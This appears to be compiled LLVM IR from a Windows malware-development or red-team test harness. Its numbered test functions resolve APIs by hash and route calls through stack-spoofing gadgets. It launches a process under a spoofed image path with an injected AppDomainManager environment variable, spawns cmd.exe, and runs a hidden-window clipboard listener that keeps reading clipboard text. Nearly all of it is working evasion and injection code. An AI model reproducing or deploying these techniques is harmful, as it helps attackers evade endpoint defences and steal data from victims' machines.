; ModuleID = '.\build\main.ll'
  call void @InitUnicodeString(ptr noundef %ImagePathName, ptr noundef @"??_C@_1FE@EIKMLIBO@?$AA?2?$AA?$DP?$AA?$DP?$AA?2?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAU?$AAe?$AAv?$AAA?$AAp?$AAp?$AAM?$AAo@")
  %5 = call ptr @GetProcAddressH(i32 717748261, i32 713267008)
  %6 = call ptr (ptr, ...) @SpoofCall(ptr %5)
  store ptr %6, ptr %EnvironmentBlock, align 8
  %7 = load ptr, ptr %EnvironmentBlock, align 8
  store ptr %7, ptr %lpTemp, align 8
  br label %while.cond

while.cond:                                       ; preds = %while.body, %entry
  %8 = load ptr, ptr %lpTemp, align 8
  %arrayidx = getelementptr inbounds i16, ptr %8, i64 0
  %9 = load i16, ptr %arrayidx, align 2
  %conv = zext i16 %9 to i32
  %cmp = icmp ne i32 %conv, 0
  br i1 %cmp, label %while.body, label %while.end

while.body:                                       ; preds = %while.cond
  %10 = load ptr, ptr %lpTemp, align 8
  %11 = call ptr @GetProcAddressH(i32 717748261, i32 1398280955)
  %12 = call ptr (ptr, ...) @SpoofCall(ptr %11, ptr %10)
  %13 = ptrtoint ptr %12 to i32
  %add = add nsw i32 %13, 1
  %14 = load i32, ptr %cchEnvironmentBlock, align 4
  %add4 = add i32 %14, %add
  store i32 %add4, ptr %cchEnvironmentBlock, align 4
  %15 = load ptr, ptr %EnvironmentBlock, align 8
  %16 = load i32, ptr %cchEnvironmentBlock, align 4
  %idxprom = zext i32 %16 to i64
  %arrayidx5 = getelementptr inbounds i16, ptr %15, i64 %idxprom
  store ptr %arrayidx5, ptr %lpTemp, align 8
  br label %while.cond, !llvm.loop !28

while.end:                                        ; preds = %while.cond
  %17 = load i32, ptr %cchEnvironmentBlock, align 4
  %conv6 = zext i32 %17 to i64
  %add7 = add i64 %conv6, 165
  %mul = mul i64 %add7, 2
  %18 = call ptr @GetProcAddressH(i32 717748261, i32 -1441913739)
  %19 = call ptr (ptr, ...) @SpoofCall(ptr %18)
  %20 = call ptr @GetProcAddressH(i32 -2062442056, i32 -1934965594)
  %21 = call ptr (ptr, ...) @SpoofCall(ptr %20, ptr %19, i32 8, i64 %mul)
  store ptr %21, ptr %NewEnvironmentBlock, align 8
  %22 = load ptr, ptr %NewEnvironmentBlock, align 8
  %23 = load ptr, ptr %EnvironmentBlock, align 8
  %24 = load i32, ptr %cchEnvironmentBlock, align 4
  %conv10 = zext i32 %24 to i64
  %mul11 = mul i64 %conv10, 2
  call void @MemCopy(ptr align 2 %22, ptr align 2 %23, i64 %mul11, i1 false)
  %25 = load ptr, ptr %NewEnvironmentBlock, align 8
  %26 = load i32, ptr %cchEnvironmentBlock, align 4
  %idxprom12 = zext i32 %26 to i64
  %arrayidx13 = getelementptr inbounds i16, ptr %25, i64 %idxprom12
  %arraydecay = getelementptr inbounds [165 x i16], ptr %wszAppDomainManagerEnv, i64 0, i64 0
  call void @MemCopy(ptr align 2 %arrayidx13, ptr align 16 %arraydecay, i64 330, i1 false)
  %27 = load ptr, ptr %NewEnvironmentBlock, align 8
  %28 = call ptr @GetProcAddressH(i32 -2062442056, i32 39198153)
  %29 = call ptr (ptr, ...) @SpoofCall(ptr %28, ptr %pProcessParameters, ptr %SpoofedImagePathName, ptr null, ptr %CurrentDirectory, ptr %CommandLine, ptr %27, ptr null, ptr null, ptr null, ptr null, i32 1)
  %30 = ptrtoint ptr %29 to i32
  store i32 %30, ptr %Status, align 4
  %31 = load i32, ptr %Status, align 4
  %cmp15 = icmp sge i32 %31, 0
  br i1 %cmp15, label %if.end, label %if.then

if.then:                                          ; preds = %while.end
  %32 = load i32, ptr %Status, align 4
  %33 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %34 = call ptr (ptr, ...) @SpoofCall(ptr %33, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %34, i32 noundef 2982, ptr noundef @"??_C@_1DK@DFBNHIHA@?$AAR?$AAt?$AAl?$AAC?$AAr?$AAe?$AAa?$AAt?$AAe?$AAP?$AAr?$AAo?$AAc?$AAe?$AAs?$AAs?$AAP?$AAa?$AAr?$AAa?$AAm?$AAe?$AAt?$AAe?$AAr?$AAs?$AAE?$AAx?$AA?$AA@", ptr noundef @"??_C@_1BA@KEJECHKE@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA7?$AA1?$AA?$AA@", i32 noundef %32)
  br label %CLEANUP

if.end:                                           ; preds = %while.end
  %35 = call ptr @GetProcAddressH(i32 717748261, i32 1960714644)
  %36 = call ptr (ptr, ...) @SpoofCall(ptr %35)
  %37 = load ptr, ptr %pProcessParameters, align 8
  %38 = call ptr @GetProcAddressH(i32 -2062442056, i32 1988477079)
  %39 = call ptr (ptr, ...) @SpoofCall(ptr %38, ptr %ImagePathName, i32 0, ptr %37, ptr null, ptr null, ptr %36, i8 1, ptr null, ptr null, ptr %ProcInfo)
  %40 = ptrtoint ptr %39 to i32
  store i32 %40, ptr %Status, align 4
  %41 = load i32, ptr %Status, align 4
  %cmp20 = icmp sge i32 %41, 0
  br i1 %cmp20, label %if.end24, label %if.then22

if.then22:                                        ; preds = %if.end
  %42 = load i32, ptr %Status, align 4
  %43 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %44 = call ptr (ptr, ...) @SpoofCall(ptr %43, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %44, i32 noundef 2988, ptr noundef @"??_C@_1CK@BPHIOMF@?$AAR?$AAt?$AAl?$AAC?$AAr?$AAe?$AAa?$AAt?$AAe?$AAU?$AAs?$AAe?$AAr?$AAP?$AAr?$AAo?$AAc?$AAe?$AAs?$AAs?$AA?$AA@", ptr noundef @"??_C@_1BA@KEJECHKE@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA7?$AA1?$AA?$AA@", i32 noundef %42)
  br label %CLEANUP

if.end24:                                         ; preds = %if.end
  %ThreadHandle = getelementptr inbounds %struct._RTL_USER_PROCESS_INFORMATION, ptr %ProcInfo, i32 0, i32 2
  %45 = load ptr, ptr %ThreadHandle, align 8
  %46 = call ptr @GetProcAddressH(i32 -2062442056, i32 1553429941)
  %47 = call ptr (ptr, ...) @SpoofCall(ptr %46, ptr %45, ptr null)
  %48 = ptrtoint ptr %47 to i32
  store i32 %48, ptr %Status, align 4
  %49 = load i32, ptr %Status, align 4
  %cmp26 = icmp sge i32 %49, 0
  br i1 %cmp26, label %if.end30, label %if.then28

if.then28:                                        ; preds = %if.end24
  %50 = load i32, ptr %Status, align 4
  %51 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %52 = call ptr (ptr, ...) @SpoofCall(ptr %51, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %52, i32 noundef 2994, ptr noundef @"??_C@_1BO@DHGBLJFM@?$AAN?$AAt?$AAR?$AAe?$AAs?$AAu?$AAm?$AAe?$AAT?$AAh?$AAr?$AAe?$AAa?$AAd?$AA?$AA@", ptr noundef @"??_C@_1BA@KEJECHKE@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA7?$AA1?$AA?$AA@", i32 noundef %50)
  br label %CLEANUP

if.end30:                                         ; preds = %if.end24
  %ProcessHandle = getelementptr inbounds %struct._RTL_USER_PROCESS_INFORMATION, ptr %ProcInfo, i32 0, i32 1
  %53 = load ptr, ptr %ProcessHandle, align 8
  %54 = call ptr @GetProcAddressH(i32 -2062442056, i32 1439156853)
  %55 = call ptr (ptr, ...) @SpoofCall(ptr %54, ptr %53)
  %56 = ptrtoint ptr %55 to i32
  %ThreadHandle32 = getelementptr inbounds %struct._RTL_USER_PROCESS_INFORMATION, ptr %ProcInfo, i32 0, i32 2
  %57 = load ptr, ptr %ThreadHandle32, align 8
  %58 = call ptr @GetProcAddressH(i32 -2062442056, i32 1439156853)
  %59 = call ptr (ptr, ...) @SpoofCall(ptr %58, ptr %57)
  %60 = ptrtoint ptr %59 to i32
  br label %CLEANUP

CLEANUP:                                          ; preds = %if.end30, %if.then28, %if.then22, %if.then
  %61 = load ptr, ptr %pProcessParameters, align 8
  %cmp34 = icmp ne ptr %61, null
  br i1 %cmp34, label %if.then36, label %if.end38

if.then36:                                        ; preds = %CLEANUP
  %62 = load ptr, ptr %pProcessParameters, align 8
  %63 = call ptr @GetProcAddressH(i32 -2062442056, i32 1636776794)
  %64 = call ptr (ptr, ...) @SpoofCall(ptr %63, ptr %62)
  %65 = ptrtoint ptr %64 to i32
  br label %if.end38

if.end38:                                         ; preds = %if.then36, %CLEANUP
  %66 = load ptr, ptr %EnvironmentBlock, align 8
  %cmp39 = icmp ne ptr %66, null
  br i1 %cmp39, label %if.then41, label %if.end43

if.then41:                                        ; preds = %if.end38
  %67 = load ptr, ptr %EnvironmentBlock, align 8
  %68 = call ptr @GetProcAddressH(i32 717748261, i32 729656512)
  %69 = call ptr (ptr, ...) @SpoofCall(ptr %68, ptr %67)
  %70 = ptrtoint ptr %69 to i32
  br label %if.end43

if.end43:                                         ; preds = %if.then41, %if.end38
  %71 = load ptr, ptr %NewEnvironmentBlock, align 8
  call void @FreeAllocatedHeap(ptr noundef %71)
  ret void
}

declare dso_local void @InitUnicodeString(ptr noundef, ptr noundef) #1

declare dllimport i32 @RtlCreateProcessParametersEx(ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, i32 noundef) #1

declare dllimport i32 @RtlCreateUserProcess(ptr noundef, i32 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef, i8 noundef, ptr noundef, ptr noundef, ptr noundef) #1

declare dllimport ptr @GetCurrentProcess() #1

declare dllimport i32 @NtResumeThread(ptr noundef, ptr noundef) #1

declare dllimport i32 @NtClose(ptr noundef) #1

declare dllimport i32 @RtlDestroyProcessParameters(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test172() #0 {
entry:
  %call = call i32 @_HashStringRotr32A(ptr noundef @"??_C@_0L@ICELFGH@IUMSDK?4DLL?$AA@")
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_07KDEFMAII@0x?$CF08x?6?$AA@", i32 noundef %call)
  ret void
}

declare dso_local i32 @_HashStringRotr32A(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test173() #0 {
entry:
  %dwFrameSize = alloca i32, align 4
  store i32 0, ptr %dwFrameSize, align 4
  %call = call i64 @FindGadget(i32 noundef 0, ptr noundef %dwFrameSize)
  %call1 = call i64 @FindGadget(i32 noundef 1, ptr noundef %dwFrameSize)
  ret void
}

declare dso_local i64 @FindGadget(i32 noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test174() #0 {
entry:
  %pRuntimeFunctionList = alloca ptr, align 8
  %dwNumberOfFunctions = alloca i32, align 4
  %hModule = alloca ptr, align 8
  %i = alloca i32, align 4
  %dwFrameSize = alloca i32, align 4
  %pUnwindInfo = alloca ptr, align 8
  store ptr null, ptr %pRuntimeFunctionList, align 8
  store i32 0, ptr %dwNumberOfFunctions, align 4
  store ptr null, ptr %hModule, align 8
  store i32 0, ptr %i, align 4
  store i32 0, ptr %dwFrameSize, align 4
  store ptr null, ptr %pUnwindInfo, align 8
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 703183748)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr null)
  store ptr %1, ptr %hModule, align 8
  %2 = load ptr, ptr %hModule, align 8
  %call1 = call ptr @GetExceptionDirectoryAddress(ptr noundef %2, ptr noundef %dwNumberOfFunctions)
  store ptr %call1, ptr %pRuntimeFunctionList, align 8
  store i32 0, ptr %i, align 4
  br label %for.cond

for.cond:                                         ; preds = %for.inc, %entry
  %3 = load i32, ptr %i, align 4
  %4 = load i32, ptr %dwNumberOfFunctions, align 4
  %cmp = icmp ult i32 %3, %4
  br i1 %cmp, label %for.body, label %for.end

for.body:                                         ; preds = %for.cond
  %5 = load ptr, ptr %hModule, align 8
  %6 = ptrtoint ptr %5 to i64
  %7 = load ptr, ptr %pRuntimeFunctionList, align 8
  %8 = load i32, ptr %i, align 4
  %idxprom = zext i32 %8 to i64
  %arrayidx = getelementptr inbounds %struct._IMAGE_RUNTIME_FUNCTION_ENTRY, ptr %7, i64 %idxprom
  %9 = getelementptr inbounds %struct._IMAGE_RUNTIME_FUNCTION_ENTRY, ptr %arrayidx, i32 0, i32 2
  %10 = load i32, ptr %9, align 4
  %conv = zext i32 %10 to i64
  %add = add i64 %6, %conv
  %11 = inttoptr i64 %add to ptr
  store ptr %11, ptr %pUnwindInfo, align 8
  %12 = load ptr, ptr %pUnwindInfo, align 8
  %13 = load ptr, ptr %hModule, align 8
  %call2 = call i32 @GetStackFrameSize(ptr noundef %13, ptr noundef %12)
  store i32 %call2, ptr %dwFrameSize, align 4
  %14 = load i32, ptr %dwFrameSize, align 4
  %15 = load ptr, ptr %pRuntimeFunctionList, align 8
  %16 = load i32, ptr %i, align 4
  %idxprom3 = zext i32 %16 to i64
  %arrayidx4 = getelementptr inbounds %struct._IMAGE_RUNTIME_FUNCTION_ENTRY, ptr %15, i64 %idxprom3
  %BeginAddress = getelementptr inbounds %struct._IMAGE_RUNTIME_FUNCTION_ENTRY, ptr %arrayidx4, i32 0, i32 0
  %17 = load i32, ptr %BeginAddress, align 4
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_0BI@BIJJBANF@Address?50x?$CF08x?3?50x?$CF08x?6?$AA@", i32 noundef %17, i32 noundef %14)
  br label %for.inc

for.inc:                                          ; preds = %for.body
  %18 = load i32, ptr %i, align 4
  %inc = add i32 %18, 1
  store i32 %inc, ptr %i, align 4
  br label %for.cond, !llvm.loop !29

for.end:                                          ; preds = %for.cond
  ret void
}

declare dso_local ptr @GetExceptionDirectoryAddress(ptr noundef, ptr noundef) #1

declare dso_local i32 @GetStackFrameSize(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test175() #0 {
entry:
  %dwFrameOffset = alloca i32, align 4
  %dwFrameSize = alloca i32, align 4
  store i32 0, ptr %dwFrameOffset, align 4
  store i32 0, ptr %dwFrameSize, align 4
  %call = call i64 @FindSetFpProlog(ptr noundef %dwFrameOffset, ptr noundef %dwFrameSize, ptr noundef null)
  ret void
}

declare dso_local i64 @FindSetFpProlog(ptr noundef, ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test176() #0 {
entry:
  %dwFrameOffset = alloca i32, align 4
  %dwFrameSize = alloca i32, align 4
  store i32 0, ptr %dwFrameOffset, align 4
  store i32 0, ptr %dwFrameSize, align 4
  %call = call i64 @FindSaveRbp(ptr noundef %dwFrameOffset, ptr noundef %dwFrameSize, ptr noundef null)
  ret void
}

declare dso_local i64 @FindSaveRbp(ptr noundef, ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test177() #0 {
entry:
  %cnt.addr.i4 = alloca i64, align 8
  %ptr.addr.i5 = alloca ptr, align 8
  %vptr.i6 = alloca ptr, align 8
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %pi = alloca %struct._PROCESS_INFORMATION, align 8
  %si = alloca %struct._STARTUPINFOW, align 8
  %call = call i32 @SetupStackSpoofing()
  %tobool = icmp ne i32 %call, 0
  br i1 %tobool, label %if.end, label %if.then

if.then:                                          ; preds = %entry
  br label %return

if.end:                                           ; preds = %entry
  store i64 24, ptr %cnt.addr.i4, align 8
  store ptr %pi, ptr %ptr.addr.i5, align 8
  %0 = load ptr, ptr %ptr.addr.i5, align 8
  store ptr %0, ptr %vptr.i6, align 8
  %1 = load ptr, ptr %vptr.i6, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i4, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i5, align 8
  store i64 104, ptr %cnt.addr.i, align 8
  store ptr %si, ptr %ptr.addr.i, align 8
  %5 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %5, ptr %vptr.i, align 8
  %6 = load ptr, ptr %vptr.i, align 8
  %7 = ptrtoint ptr %6 to i64
  %8 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %6, i8 0, i64 %8, i1 true)
  %9 = load ptr, ptr %ptr.addr.i, align 8
  %cb = getelementptr inbounds %struct._STARTUPINFOW, ptr %si, i32 0, i32 0
  store i32 104, ptr %cb, align 8
  %10 = call ptr @GetProcAddressH(i32 717748261, i32 -2087873110)
  %call3 = call ptr (ptr, ...) @SpoofCall(ptr noundef %10, ptr noundef @"??_C@_1DI@HBOPCIDN@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@", ptr noundef null, ptr noundef null, ptr noundef null, i64 noundef 0, i64 noundef 0, ptr noundef null, ptr noundef null, ptr noundef %si, ptr noundef %pi)
  br label %return

return:                                           ; preds = %if.end, %if.then
  ret void
}

declare dso_local i32 @SetupStackSpoofing(...) #1

declare dso_local ptr @SpoofCall(ptr noundef, ...) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test178() #0 {
entry:
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %hClipboard = alloca ptr, align 8
  %lpMessage = alloca ptr, align 8
  %hWindow = alloca ptr, align 8
  %Message = alloca %struct.tagMSG, align 8
  store ptr null, ptr %hClipboard, align 8
  store ptr null, ptr %lpMessage, align 8
  store ptr null, ptr %hWindow, align 8
  %0 = call ptr @GetProcAddressH(i32 2106467480, i32 1756224631)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, i32 0, ptr @"??_C@_19PLOBJMHF@?$AAE?$AAd?$AAi?$AAt?$AA?$AA@", ptr @"??_C@_1BM@CFKFMHDI@?$AAS?$AAa?$AAm?$AAp?$AAl?$AAe?$AA?5?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AA?$AA@", i32 536870912, i32 100, i32 100, i32 100, i32 100, ptr null, ptr null, ptr null, ptr null)
  store ptr %1, ptr %hWindow, align 8
  %2 = load ptr, ptr %hWindow, align 8
  %cmp = icmp eq ptr %2, null
  br i1 %cmp, label %if.then, label %if.end

if.then:                                          ; preds = %entry
  %3 = call ptr @GetProcAddressH(i32 717748261, i32 816656067)
  %4 = call ptr (ptr, ...) @SpoofCall(ptr %3)
  %5 = ptrtoint ptr %4 to i32
  %6 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %7 = call ptr (ptr, ...) @SpoofCall(ptr %6, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %7, i32 noundef 3077, ptr noundef @"??_C@_1CA@KFLBENFG@?$AAC?$AAr?$AAe?$AAa?$AAt?$AAe?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAE?$AAx?$AAW?$AA?$AA@", ptr noundef @"??_C@_1BA@NJJMGICO@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA7?$AA8?$AA?$AA@", i32 noundef %5)
  br label %CLEANUP

if.end:                                           ; preds = %entry
  %8 = load ptr, ptr %hWindow, align 8
  %9 = call ptr @GetProcAddressH(i32 2106467480, i32 -911739471)
  %10 = call ptr (ptr, ...) @SpoofCall(ptr %9, ptr %8)
  %11 = ptrtoint ptr %10 to i32
  %tobool = icmp ne i32 %11, 0
  br i1 %tobool, label %if.end7, label %if.then4

if.then4:                                         ; preds = %if.end
  %12 = call ptr @GetProcAddressH(i32 717748261, i32 816656067)
  %13 = call ptr (ptr, ...) @SpoofCall(ptr %12)
  %14 = ptrtoint ptr %13 to i32
  %15 = call ptr @GetProcAddressH(i32 717748261, i32 913620588)
  %16 = call ptr (ptr, ...) @SpoofCall(ptr %15, ptr @"??_C@_1BM@NAFJCHKH@?$AA?4?$AA?2?$AAT?$AAe?$AAs?$AAt?$AA?2?$AAm?$AAa?$AAi?$AAn?$AA?4?$AAc?$AA?$AA@")
  call void (ptr, ...) @LogError(ptr noundef @"??_C@_1FA@IIHENIHP@?$AA?$CF?$AAs?$AA?4?$AA?$CF?$AAd?$AA?3?$AA?5?$AA?$CF?$AAs?$AA?5?$AAf?$AAa?$AAi?$AAl?$AAe?$AAd?$AA?5?$AAa?$AAt?$AA?5?$AA?$CF?$AAs?$AA?5?$AA?$CI?$AAE?$AAr?$AAr?$AAo?$AAr?$AA?3?$AA?5?$AA0@", ptr noundef %16, i32 noundef 3082, ptr noundef @"??_C@_1DG@OKEBCOLB@?$AAA?$AAd?$AAd?$AAC?$AAl?$AAi?$AAp?$AAb?$AAo?$AAa?$AAr?$AAd?$AAF?$AAo?$AAr?$AAm?$AAa?$AAt?$AAL?$AAi?$AAs?$AAt?$AAe?$AAn?$AAe?$AAr?$AA?$AA@", ptr noundef @"??_C@_1BA@NJJMGICO@?$AAt?$AAe?$AAs?$AAt?$AA1?$AA7?$AA8?$AA?$AA@", i32 noundef %14)
  br label %CLEANUP

if.end7:                                          ; preds = %if.end
  br label %while.body

while.body:                                       ; preds = %if.end25, %if.end7
  store i64 48, ptr %cnt.addr.i, align 8
  store ptr %Message, ptr %ptr.addr.i, align 8
  %17 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %17, ptr %vptr.i, align 8
  %18 = load ptr, ptr %vptr.i, align 8
  %19 = ptrtoint ptr %18 to i64
  %20 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %18, i8 0, i64 %20, i1 true)
  %21 = load ptr, ptr %ptr.addr.i, align 8
  %22 = load ptr, ptr %hWindow, align 8
  %23 = call ptr @GetProcAddressH(i32 2106467480, i32 -949633579)
  %24 = call ptr (ptr, ...) @SpoofCall(ptr %23, ptr %Message, ptr %22, i32 797, i32 797)
  %25 = ptrtoint ptr %24 to i32
  %tobool10 = icmp ne i32 %25, 0
  br i1 %tobool10, label %if.then11, label %if.end25

if.then11:                                        ; preds = %while.body
  %message = getelementptr inbounds %struct.tagMSG, ptr %Message, i32 0, i32 1
  %26 = load i32, ptr %message, align 8
  %cmp12 = icmp eq i32 %26, 797
  br i1 %cmp12, label %if.then13, label %if.end24

if.then13:                                        ; preds = %if.then11
  %27 = call ptr @GetProcAddressH(i32 2106467480, i32 1936751431)
  %28 = call ptr (ptr, ...) @SpoofCall(ptr %27, ptr null)
  %29 = ptrtoint ptr %28 to i32
  %tobool15 = icmp ne i32 %29, 0
  br i1 %tobool15, label %if.then16, label %if.end23

if.then16:                                        ; preds = %if.then13
  %30 = call ptr @GetProcAddressH(i32 2106467480, i32 531370752)
  %31 = call ptr (ptr, ...) @SpoofCall(ptr %30, i32 13)
  store ptr %31, ptr %hClipboard, align 8
  %32 = load ptr, ptr %hClipboard, align 8
  %cmp18 = icmp ne ptr %32, null
  br i1 %cmp18, label %if.then19, label %if.end21

if.then19:                                        ; preds = %if.then16
  %33 = load ptr, ptr %hClipboard, align 8
  %34 = call ptr @GetProcAddressH(i32 245326953, i32 -1202209597)
  %35 = call ptr (ptr, ...) @SpoofCall(ptr %34, ptr %33)
  store ptr %35, ptr %lpMessage, align 8
  br label %if.end21

if.end21:                                         ; preds = %if.then19, %if.then16
  %36 = call ptr @GetProcAddressH(i32 2106467480, i32 1905622223)
  %37 = call ptr (ptr, ...) @SpoofCall(ptr %36)
  %38 = ptrtoint ptr %37 to i32
  br label %if.end23

if.end23:                                         ; preds = %if.end21, %if.then13
  br label %if.end24

if.end24:                                         ; preds = %if.end23, %if.then11
  br label %if.end25

if.end25:                                         ; preds = %if.end24, %while.body
  %39 = call ptr @GetProcAddressH(i32 717748261, i32 424171848)
  %40 = call ptr (ptr, ...) @SpoofCall(ptr %39, i32 5000)
  br label %while.body

CLEANUP:                                          ; preds = %if.then4, %if.then
  %41 = load ptr, ptr %hWindow, align 8
  %cmp26 = icmp ne ptr %41, null
  br i1 %cmp26, label %if.then27, label %if.end29

if.then27:                                        ; preds = %CLEANUP
  %42 = load ptr, ptr %hWindow, align 8
  %43 = call ptr @GetProcAddressH(i32 2106467480, i32 -2135641320)
  %44 = call ptr (ptr, ...) @SpoofCall(ptr %43, ptr %42)
  %45 = ptrtoint ptr %44 to i32
  br label %if.end29

if.end29:                                         ; preds = %if.then27, %CLEANUP
  ret void
}

declare dllimport ptr @CreateWindowExW(i32 noundef, ptr noundef, ptr noundef, i32 noundef, i32 noundef, i32 noundef, i32 noundef, i32 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) #1
